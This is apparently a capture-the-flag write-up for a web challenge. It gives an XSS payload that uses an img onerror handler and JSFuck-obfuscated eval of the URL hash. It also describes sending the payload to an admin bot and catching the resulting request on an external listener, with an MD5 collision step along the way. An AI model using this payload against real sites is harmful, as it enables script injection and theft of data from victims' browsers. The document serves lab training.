**Challenge:** http://159.65.249.122:4111/

Payload: `http://159.65.249.122:4111/?<img src onerror =eval(unescape(eval(location.hash.substr(1))))>#<JS code>`

Ps: `location.hash.substr(1)` has to be encoded using [JSFuck](http://www.jsfuck.com/) (uncheck `Eval source` option)

Create an HTTP server or you can use some online solutions like https://webhook.site/ or https://requestbin.com/.

Use this [javascript code](https://gist.github.com/EffectRenan/9e85ddc199668e7b56decd88c875ef6e) to generate a payload which use `eval` function.
  - Edit the variable `host` with your URL.
  - Execute: `node eval-charcode.js`.

Final payload: `http://159.65.249.122:4111/?<img src onerror =eval(unescape(eval(<JSFuck encoded>)))>#<Eval function generated>`

Access `http://159.65.249.122:4111/contact` to get the bytes for hash collision.

Use [this python script](https://gist.github.com/EffectRenan/2425aa1ab52e35f6f8ee8b31b2582d65) to generate a hash collision.
  - `python2 MD5-collision.py "<bytes given>" 0`

Send the final payload to Admin and you will receive a request with the flag.

**Flag**: HACKAFLAG{Noth1n_h4rd_here}
